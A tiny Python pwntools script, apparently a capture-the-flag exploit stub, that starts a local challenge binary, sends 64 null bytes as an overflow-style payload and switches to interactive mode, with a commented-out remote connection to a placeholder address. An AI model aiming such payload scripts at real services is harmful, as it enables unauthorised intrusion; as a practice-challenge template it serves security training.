from pwn import *

# r = remote("00.00.000.00",0000)
r = process("./chall")

payload = "\x00"*64
r.sendline(payload)
r.interactive()